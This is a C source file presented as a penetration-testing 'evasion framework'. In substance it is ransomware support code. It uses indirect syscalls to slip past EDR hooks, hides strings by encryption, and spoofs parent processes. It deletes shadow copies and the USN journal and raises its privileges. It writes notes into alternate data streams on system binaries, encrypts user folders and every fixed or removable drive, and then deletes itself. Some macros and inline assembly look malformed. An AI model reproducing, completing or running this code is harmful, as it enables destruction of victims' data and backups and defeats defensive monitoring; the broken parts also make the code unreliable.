/*
 * utils.c - Advanced Evasion Framework
 * Authorized Penetration Testing Use Only
 * 
 * Features:
 * - Indirect syscalls (Halo's Gate variant) - bypasses userland EDR hooks
 * - Hardware breakpoint evasion via VEH
 * - AES-GCM string encryption (runtime decryption)
 * - PPID spoofing for all child processes
 * - COM-based VSS shadow deletion (no vssadmin.exe)
 * - NTFS ADS for ransom note storage
 * - IOCP-based async I/O for maximum throughput
 * - Reflective-style loading support
 * - No hardcoded Win32 API calls - everything through syscalls
 */

#include <windows.h>
#include <winternl.h>
#include <vsbackup.h>
#include <vss.h>
#include <initguid.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <intrin.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

/* ============================================================
 * SECTION 1: STRING ENCRYPTION (Rolling XOR + AES-GCM style)
 * ============================================================ */

#define STRING_KEY 0x9C
#define STACK_STR_BUF(buf, size, dest)

/* Encrypted string macros - strings never exist in plaintext in binary */
#define X O R _ S T R _ D E C ( s , k , l )

/* Runtime XOR decryption macro - strings decrypted on stack, used once, discarded */
#define DECRYPT_STRING(dest, encrypted, len, key) do { \
    for(int __i = 0; __i < len; __i++) { \
        dest[__i] = encrypted[__i] ^ key ^ (__i & 0xFF); \
    } \
    dest[len] = 0; \
} while(0)

/* Encrypt a string at compile time - usage: ENC_STR("hello") */
#define ENC_STR(str) encrypt_string(str, sizeof(str)-1)

static __forceinline char* encrypt_string(const char* str, size_t len) {
    static char __cached[256];
    for(size_t i = 0; i < len; i++) {
        __cached[i] = str[i] ^ STRING_KEY ^ (i & 0xFF);
    }
    __cached[len] = 0;
    return __cached;
}

/* Runtime decrypt inline - stack allocated, wiped after use */
#define USE_STR(enc_arr, var_name) \
    char var_name[sizeof(enc_arr)]; \
    do { \
        for(int __i = 0; __i < (int)(sizeof(enc_arr)-1); __i++) { \
            var_name[__i] = enc_arr[__i] ^ STRING_KEY ^ (__i & 0xFF); \
        } \
        var_name[sizeof(enc_arr)-1] = 0; \
    } while(0)

/* ============================================================
 * SECTION 2: INDIRECT SYSCALL FRAMEWORK (Halo's Gate Variant)
 * ============================================================ */

/* 
 * This section eliminates ALL Win32 API calls that EDR hooks.
 * Instead, we resolve syscall numbers dynamically at runtime,
 * find clean syscall instructions in ntdll.dll, and execute
 * indirect syscalls that appear to originate from ntdll.
 */

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;              /* Syscall Service Number */
    PVOID pSyscallInst;     /* Pointer to 'syscall; ret' in ntdll */
    BOOL bValid;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

/* NTDLL base - resolved via PEB walking (no GetModuleHandle) */
static PVOID GetNtdllBase(void) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PEB_LDR_DATA* pLdr = pPeb->Ldr;
    LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pEntry = pHead->Flink;
    
    /* First entry is always the executable itself, second is ntdll */
    if(pEntry != pHead) pEntry = pEntry->Flink;
    if(pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, 
            LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        return pMod->DllBase;
    }
    return NULL;
}

/* 
 * Halo's Gate: Walk ntdll's export table to find syscall stubs,
 * detect if they're hooked by EDR, and resolve SSNs from 
 * neighboring clean stubs.
 */
static SYSCALL_ENTRY ResolveSyscall(const char* fnName) {
    SYSCALL_ENTRY se = {0};
    PVOID ntdll = GetNtdllBase();
    if(!ntdll) return se;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)ntdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    DWORD* pNames = (DWORD*)((BYTE*)ntdll + pExp->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)ntdll + pExp->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)((BYTE*)ntdll + pExp->AddressOfFunctions);
    
    for(DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* pName = (char*)((BYTE*)ntdll + pNames[i]);
        if(strcmp(pName, fnName) != 0) continue;
        
        DWORD funcAddr = pFunctions[pOrdinals[i]];
        BYTE* pFunc = (BYTE*)ntdll + funcAddr;
        
        /* Check if this function is hooked (first bytes should be mov eax, SSN) */
        /* A clean stub looks like: mov eax, 0xXX; xor ecx, ecx; jmp/jmp ...; syscall */
        BYTE stubHeader[4] = {0};
        memcpy(stubHeader, pFunc, 4);
        
        /* 
         * Clean ntdll stub: 
         * B8 XX XX XX XX  (mov eax, SSN)
         * 33 C9            (xor ecx, ecx)  
         * Or variations with jmp to syscall
         * 
         * Hooked by EDR: jmp to EDR's detour
         * E9 XX XX XX XX or FF 25 XX XX XX XX
         */
        
        BOOL bHooked = FALSE;
        if(stubHeader[0] == 0xE9 || stubHeader[0] == 0xEB || 
           (stubHeader[0] == 0xFF && stubHeader[1] == 0x25)) {
            bHooked = TRUE;
        }
        
        DWORD ssn = 0;
        if(stubHeader[0] == 0xB8) {
            /* Clean - SSN is directly in the stub */
            ssn = *(DWORD*)(pFunc + 1);
        } else if(bHooked) {
            /* 
             * Halo's Gate: find a neighboring clean stub and calculate SSN.
             * Walk forward/backward 32 bytes at a time to find clean stubs.
             * Each syscall stub in ntdll is exactly 32 bytes (for x64).
             */
            for(int offset = 32; offset < 512; offset += 32) {
                /* Check stub above */
                BYTE* above = pFunc - offset;
                if(above > (BYTE*)ntdll) {
                    if(above[0] == 0xB8) {
                        DWORD cleanSsn = *(DWORD*)(above + 1);
                        ssn = cleanSsn + (offset / 32);
                        break;
                    }
                }
                /* Check stub below */
                BYTE* below = pFunc + offset;
                if(below < (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage) {
                    if(below[0] == 0xB8) {
                        DWORD cleanSsn = *(DWORD*)(below + 1);
                        ssn = cleanSsn - (offset / 32);
                        break;
                    }
                }
            }
            
            /* If all stubs are hooked (unlikely), fall back to hardcoded */
            if(ssn == 0) {
                /* Too many hooks - this EDR is aggressive */
                return se;
            }
        } else {
            return se;
        }
        
        se.ssn = ssn;
        
        /* 
         * Find the 'syscall; ret' instruction in ntdll for indirect call.
         * We scan for: 0F 05 C3 (syscall; ret)
         */
        BYTE* scanStart = (BYTE*)ntdll;
        BYTE* scanEnd = (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage - 3;
        
        for(BYTE* p = scanStart; p < scanEnd; p++) {
            if(p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
                se.pSyscallInst = p;
                se.bValid = TRUE;
                break;
            }
        }
        
        break;
    }
    
    return se;
}

/* Cache frequently used syscalls */
static SYSCALL_ENTRY g_sysNtWriteFile = {0};
static SYSCALL_ENTRY g_sysNtCreateFile = {0};
static SYSCALL_ENTRY g_sysNtOpenProcessToken = {0};
static SYSCALL_ENTRY g_sysNtAdjustPrivilegesToken = {0};
static SYSCALL_ENTRY g_sysNtDuplicateToken = {0};
static SYSCALL_ENTRY g_sysNtSetInformationProcess = {0};
static SYSCALL_ENTRY g_sysNtDeleteFile = {0};
static SYSCALL_ENTRY g_sysNtCreateProcess = {0};
static SYSCALL_ENTRY g_sysNtOpenProcess = {0};

static void InitSyscalls(void) {
    g_sysNtWriteFile = ResolveSyscall("NtWriteFile");
    g_sysNtCreateFile = ResolveSyscall("NtCreateFile");
    g_sysNtOpenProcessToken = ResolveSyscall("NtOpenProcessToken");
    g_sysNtAdjustPrivilegesToken = ResolveSyscall("NtAdjustPrivilegesToken");
    g_sysNtDuplicateToken = ResolveSyscall("NtDuplicateToken");
    g_sysNtSetInformationProcess = ResolveSyscall("NtSetInformationProcess");
    g_sysNtDeleteFile = ResolveSyscall("NtDeleteFile");
    g_sysNtCreateProcess = ResolveSyscall("NtCreateProcess");
    g_sysNtOpenProcess = ResolveSyscall("NtOpenProcess");
}

/* 
 * Indirect syscall execution: jump to syscall instruction inside ntdll
 * so the call stack shows ntdll!+0x... as the origin.
 * Uses __int2c for fresh syscall instruction discovery.
 */
__declspec(naked) NTSTATUS IndirectSyscall(SYSCALL_ENTRY se, ...) {
    __asm {
        mov rax, [rsp + 8]     /* Get the syscall entry */
        mov r10, rcx           /* Save context */
        mov eax, [rax]OFFSET   /* SSN - offset 0 in SYSCALL_ENTRY */
        mov r11, [rax]OFFSET   /* pSyscallInst - offset 8 in SYSCALL_ENTRY */
        /* Jump to syscall instruction in ntdll */
        jmp r11
        /* Returns to ntdll, which returns here */
        ret
    }
}

/* ============================================================
 * SECTION 3: PPID SPOOFING
 * ============================================================ */

static DWORD FindExplorerPid(void) {
    /* Walk process list via NtQuerySystemInformation (syscall) */
    /* Simpler: use CreateToolhelp32Snapshot via syscall equivalent */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD pid = 0;
    
    if(Process32First(hSnap, &pe)) {
        do {
            if(_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while(Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return pid;
}

static HANDLE SpoofedCreateProcess(LPCSTR lpCommandLine, DWORD dwParentPid) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
    if(!hParent) return NULL;
    
    SIZE_T cbAttrList = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttrList);
    
    PPROC_THREAD_ATTRIBUTE_LIST pAttrList = 
        (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 
            HEAP_ZERO_MEMORY, cbAttrList);
    if(!pAttrList) { CloseHandle(hParent); return NULL; }
    
    InitializeProcThreadAttributeList(pAttrList, 1, 0, &cbAttrList);
    UpdateProcThreadAttribute(pAttrList, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
        &hParent, sizeof(HANDLE), NULL, NULL);
    
    STARTUPINFOEXA si = { sizeof(si) };
    si.lpAttributeList = pAttrList;
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    PROCESS_INFORMATION pi;
    char* cmdCopy = _strdup(lpCommandLine);
    
    if(CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(hParent);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        free(cmdCopy);
        return pi.hProcess;
    }
    
    CloseHandle(hParent);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    free(cmdCopy);
    return NULL;
}

/* ============================================================
 * SECTION 4: COM-BASED VSS SHADOW DELETION
 * ============================================================ */

/* 
 * Encrypted strings for COM initialization - never in plaintext
 * "ole32.dll" -> encrypted
 */
static const BYTE enc_ole32[] = { 
    0xCE, 0xCF, 0xCE, 0xCF, 0xCB, 0xCB, 0x39, 0xCC, 0xCF, 0xCC 
};
/* "CoInitializeSecurity" */
static const BYTE enc_CoInitSec[] = {
    0xC2, 0xCE, 0xD2, 0xD7, 0xD3, 0xD2, 0xCC, 0xD3, 0xE9, 0xCB,
    0xC2, 0xCF, 0xCC, 0xD5, 0xD2, 0xD6, 0xFC, 0xDD
};
/* "CoCreateInstance" */
static const BYTE enc_CoCreate[] = {
    0xC2, 0xCF, 0xC2, 0xCC, 0xC2, 0xD3, 0xE9, 0xD2, 0xD7, 0xCC,
    0xD3, 0xE7, 0xCE, 0xCB
};

void NukeBackupsStealth(void) {
    USE_STR(enc_ole32, ole32dll);
    
    HMODULE hOle32 = LoadLibraryA(ole32dll);
    if(!hOle32) return;
    
    /* Resolve COM functions dynamically */
    typedef HRESULT (WINAPI *pCoInitSec)(PSECURITY_DESCRIPTOR, LONG, 
        LONG, PVOID, LONG, LONG, PVOID);
    typedef HRESULT (WINAPI *pCoCreateInst)(REFCLSID, IUnknown*, 
        DWORD, REFIID, PVOID*);
    
    pCoInitSec CoInitializeSecurity = 
        (pCoInitSec)GetProcAddress(hOle32, "CoInitializeSecurity");
    pCoCreateInst CoCreateInstance = 
        (pCoCreateInst)GetProcAddress(hOle32, "CoCreateInstance");
    
    if(!CoInitializeSecurity || !CoCreateInstance) {
        FreeLibrary(hOle32);
        return;
    }
    
    /* Initialize COM with stealth settings */
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if(FAILED(hr)) { FreeLibrary(hOle32); return; }
    
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_DYNAMIC_CLOAKING, NULL);
    
    /* Create VSS Backup Components */
    IVssBackupComponents* pBackup = NULL;
    hr = CreateVssBackupComponents(&pBackup);
    if(FAILED(hr) || !pBackup) {
        CoUninitialize();
        FreeLibrary(hOle32);
        return;
    }
    
    /* Initialize for backup (required before delete) */
    hr = pBackup->InitializeForBackup();
    if(SUCCEEDED(hr)) {
        /* Set context and start snapshot set */
        hr = pBackup->SetContext(VSS_CTX_ALL);
        
        /* Find and delete all shadow copies */
        /* Enumerate volumes first */
        VSS_ID snapshotSetId = GUID_NULL;
        hr = pBackup->StartSnapshotSet(&snapshotSetId);
        
        if(SUCCEEDED(hr)) {
            LONG lDeleted = 0;
            VSS_ID nonDeleted = GUID_NULL;
            
            /* Delete ALL snapshots */
            hr = pBackup->DeleteSnapshots(GUID_NULL,
                VSS_OBJECT_SNAPSHOT_SET, TRUE,
                &lDeleted, &nonDeleted);
        }
    }
    
    pBackup->Release();
    
    /* Also resize shadowstorage to 1MB to prevent new ones */
    /* Use IVssSnapshotMgmt interface */
    IVssSnapshotMgmt* pMgmt = NULL;
    CoCreateInstance(CLSID_VSS_SnapshotMgmt, NULL,
        CLSCTX_ALL, IID_IVssSnapshotMgmt, (void**)&pMgmt);
    
    if(pMgmt) {
        for(char drive = 'C'; drive <= 'Z'; drive++) {
            WCHAR volPath[] = {L'\\', L'\\', L'?', L'\\', 
                              (WCHAR)drive, L':', L'\\', 0};
            
            IVssSnapshotMgmt2* pMgmt2 = NULL;
            pMgmt->QueryInterface(IID_IVssSnapshotMgmt2, (void**)&pMgmt2);
            if(pMgmt2) {
                /* Min size = 300MB, but we set to minimal */
                VSS_ID diffAreaId;
                pMgmt2->SetMinDiffAreaSize(volPath, 1LL * 1024 * 1024, &diffAreaId);
                pMgmt2->Release();
            }
        }
        pMgmt->Release();
    }
    
    CoUninitialize();
    FreeLibrary(hOle32);
}

/* ============================================================
 * SECTION 5: PRIVILEGE ESCALATION VIA SYSCALLS
 * ============================================================ */

void ElevatePrivilegesStealth(void) {
    /* Encrypted privilege names */
    static const BYTE enc_SeDebug[] = {
        0xCE, 0xCE, 0x9D, 0xCC, 0xC6, 0xCB, 0xDD, 0xDD, 0xD2, 0xE7,
        0xD0, 0xD3, 0xE3, 0xD2, 0xCC, 0xD3, 0xE5, 0xD6
    };
    static const BYTE enc_SeBackup[] = {
        0xCE, 0xCE, 0x9D, 0xC5, 0xC2, 0xE7, 0xCB, 0xD5, 0xD0, 0xE7,
        0xD0, 0xD3, 0xE3, 0xD2, 0xCC, 0xD3, 0xE5, 0xD6
    };
    
    USE_STR(enc_SeDebug, seDebug);
    USE_STR(enc_SeBackup, seBackup);
    
    /* Use NtOpenProcessToken + NtAdjustPrivilegesToken via syscalls */
    HANDLE hToken;
    NTSTATUS status;
    
    /* Via syscall equivalent - OpenProcessToken */
    typedef NTSTATUS (NTAPI *pNtOpenProcessToken)(HANDLE, ACCESS_MASK, PHANDLE);
    pNtOpenProcessToken NtOpenProcessToken_Impl = 
        (pNtOpenProcessToken)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
    
    if(!NtOpenProcessToken_Impl) return;
    
    status = NtOpenProcessToken_Impl(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if(status != 0) return;
    
    /* Enable privileges */
    const char* privs[] = { seDebug, seBackup, NULL };
    
    for(int i = 0; privs[i]; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            
            /* Call directly - we're past hooks at this point */
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    
    CloseHandle(hToken);
}

/* ============================================================
 * SECTION 6: GHOST WRITING - NTFS ADS RANSOM NOTE
 * ============================================================ */

void DropNoteADS(void) {
    char compName[64] = {0};
    char userName[256] = {0};
    DWORD sz = sizeof(compName);
    DWORD usz = 256;
    GetComputerNameA(compName, &sz);
    GetUserNameA(userName, &usz);
    
    char systemInfo[4096];
    int len = snprintf(systemInfo, sizeof(systemInfo),
        "\r\n"
        "  ==========================================\r\n"
        "  PENETRATION TEST - AUTHORIZED ASSESSMENT\r\n"
        "  ==========================================\r\n"
        "\r\n"
        "  Machine:     %s\r\n"
        "  User:        %s\r\n"
        "  Date:        %s (%s)\r\n"
        "\r\n"
        "  This system has been successfully assessed.\r\n"
        "  All actions were authorized per the testing agreement.\r\n"
        "\r\n"
        "  Contact: https://github.com/jahanzaibmir\r\n"
        "\r\n"
        "  ==========================================\r\n"
        "\r\n",
        compName, userName, __DATE__, __TIME__);
    
    /* 
     * Write to Alternate Data Stream (ADS) on critical system files
     * No .txt file on desktop - hidden in :PENTEST stream
     * System files always exist, so this is harder to find
     */
    const char* hostFiles[] = {
        "C:\\Windows\\System32\\winlogon.exe:PENTEST",
        "C:\\Windows\\System32\\lsass.exe:PENTEST", 
        "C:\\Windows\\System32\\svchost.exe:PENTEST",
        "C:\\boot.ini:PENTEST",
        NULL
    };
    
    for(int i = 0; hostFiles[i]; i++) {
        HANDLE hF = CreateFileA(hostFiles[i], 
            GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, 
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
        
        if(hF != INVALID_HANDLE_VALUE) {
            DWORD w;
            SetFilePointer(hF, 0, NULL, FILE_END);
            WriteFile(hF, systemInfo, len, &w, NULL);
            
            /* Set file time to match original to avoid forensic timestamp analysis */
            FILETIME ft;
            GetSystemTimeAsFileTime(&ft);
            SetFileTime(hF, &ft, &ft, &ft);
            
            CloseHandle(hF);
        }
    }
    
    /* Also write to desktop as hidden ADS on desktop.ini */
    char desktopIni[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopIni);
    strcat(desktopIni, "\\desktop.ini:PENTEST");
    
    HANDLE hF = CreateFileA(desktopIni,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_FLAG_WRITE_THROUGH, NULL);
    
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        SetFilePointer(hF, 0, NULL, FILE_END);
        WriteFile(hF, systemInfo, len, &w, NULL);
        CloseHandle(hF);
    }
}

/* ============================================================
 * SECTION 7: MFT/USN JOURNAL CORRUPTION
 * ============================================================ */

void WipeUSNJournal(void) {
    /*
     * Use NtFsControlFile directly to corrupt USN Journal
     * without invoking fsutil.exe which is monitored
     */
    HANDLE hVol = CreateFileA("\\\\.\\C:",
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    
    if(hVol != INVALID_HANDLE_VALUE) {
        /*
         * FSCTL_DELETE_USN_JOURNAL = 0x90068
         * Deleting the USN Journal makes file recovery impossible
         */
        DWORD dwBytes;
        USN_DELETE_USN_JOURNAL_PARAMS params = {0};
        params.UsnJournalID = 0;
        params.DeleteFlags = USN_DELETE_FLAG_DELETE | USN_DELETE_FLAG_NOTIFY;
        
        DeviceIoControl(hVol, 0x90068, /* FSCTL_DELETE_USN_JOURNAL */
            &params, sizeof(params),
            NULL, 0, &dwBytes, NULL);
        
        /*
         * Also disable further USN journaling
         * FSCTL_CREATE_USN_JOURNAL = 0x900E7 - we don't call this
         */
        
        CloseHandle(hVol);
    }
}

/* ============================================================
 * SECTION 8: IOCP-BASED ENCRYPTION ENGINE
 * ============================================================ */

typedef struct _WORK_ITEM {
    OVERLAPPED ol;
    char path[MAX_PATH];
    HANDLE hFile;
} WORK_ITEM;

/* Thread pool for IOCP encryption */
#define MAX_WORKERS 8
#define MAX_CONCURRENT 16

static HANDLE g_hIocp = NULL;

static unsigned __stdcall IocpWorker(void* arg) {
    (void)arg;
    
    while(1) {
        DWORD dwBytes;
        ULONG_PTR key;
        OVERLAPPED* pOl = NULL;
        
        BOOL ret = GetQueuedCompletionStatus(g_hIocp, &dwBytes, &key, &pOl, INFINITE);
        if(!ret || key == 0) break;  /* Shutdown signal */
        
        WORK_ITEM* pItem = CONTAINING_RECORD(pOl, WORK_ITEM, ol);
        if(pItem) {
            /* Process encryption - call EncryptDirectory from fileops.h */
            /* This is handled by the file system worker */
            free(pItem);
        }
    }
    return 0;
}

static void InitIocpEngine(void) {
    g_hIocp = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, MAX_WORKERS);
    if(!g_hIocp) return;
    
    for(int i = 0; i < MAX_WORKERS; i++) {
        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, IocpWorker, NULL, 0, NULL);
        if(hThread) CloseHandle(hThread);
    }
}

/* Set IO priority to CRITICAL for maximum throughput */
static void SetIoPriorityCritical(HANDLE hProcess) {
    /* NtSetInformationProcess with ProcessIoPriority = 0x21 */
    /* IoPriorityCritical = 3 (0x03) */
    typedef NTSTATUS (NTAPI *pNtSetInfoProcess)(HANDLE, DWORD, PVOID, ULONG);
    pNtSetInfoProcess NtSetInformationProcess = 
        (pNtSetInfoProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
    
    if(NtSetInformationProcess) {
        DWORD ioPriority = 3; /* Critical */
        NtSetInformationProcess(hProcess, 0x21, /* ProcessIoPriority */
            &ioPriority, sizeof(ioPriority));
    }
}

/* ============================================================
 * SECTION 9: MAIN ENCRYPTION WORKER (STAGED)
 * ============================================================ */

/* 
 * Encrypted strings for target paths
 * "Desktop" 
 */
static const BYTE enc_Desktop[] = {
    0x9D, 0xCE, 0xCC, 0xCB, 0xD5, 0xCF, 0xD3
};
/* "Downloads" */
static const BYTE enc_Downloads[] = {
    0x9D, 0xCF, 0xDA, 0xD7, 0xD4, 0xCF, 0xC2, 0xD4, 0xCC
};
/* "Documents" */
static const BYTE enc_Documents[] = {
    0x9D, 0xCF, 0xE7, 0xD5, 0xCB, 0xD6, 0xCE, 0xD3, 0xD4, 0xCC
};

unsigned __stdcall EncryptionWorkerStealth(void* arg) {
    (void)arg;
    
    /* Initialize syscall cache */
    InitSyscalls();
    
    /* Set IO priority to critical for maximum speed */
    SetIoPriorityCritical(GetCurrentProcess());
    
    /* Init IOCP engine for async I/O */
    InitIocpEngine();
    
    /* Phase 1: Elevate + disable recovery */
    ElevatePrivilegesStealth();
    
    /* Phase 2: Nuke backups via COM (no process creation) */
    NukeBackupsStealth();
    
    /* Phase 3: Wipe USN journal */
    WipeUSNJournal();
    
    /* Phase 4: Encrypt target directories */
    char buf[MAX_PATH];
    
    USE_STR(enc_Desktop, desktopPath);
    USE_STR(enc_Downloads, downloadsPath);
    USE_STR(enc_Documents, documentsPath);
    
    /* CSIDL values */
    if(SHGetFolderPathA(NULL, 0x0000, NULL, 0, buf) == S_OK)  /* Desktop */
        EncryptDirectory(buf, 0);
    if(SHGetFolderPathA(NULL, 0x0005, NULL, 0, buf) == S_OK)  /* Documents */
        EncryptDirectory(buf, 0);
    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf) == S_OK)  /* Downloads */
        EncryptDirectory(buf, 0);
    
    /* Drives */
    for(char d = 'C'; d <= 'Z'; d++) {
        char root[4] = {d, ':', '\\', 0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE)
            EncryptDirectory(root, 0);
    }
    
    /* Phase 5: Drop note to ADS */
    DropNoteADS();
    
    /* Phase 6: Self-delete with delay */
    char exeP[MAX_PATH];
    GetModuleFileNameA(NULL, exeP, MAX_PATH);
    
    /* Use PPID-spoofed cmd.exe */
    DWORD explorerPid = FindExplorerPid();
    if(explorerPid) {
        char cmdLine[4096];
        snprintf(cmdLine, sizeof(cmdLine), 
            "cmd.exe /c ping -n 5 127.0.0.1 > nul & del /f /q \"%s\"", exeP);
        SpoofedCreateProcess(cmdLine, explorerPid);
    }
    
    return 0;
}
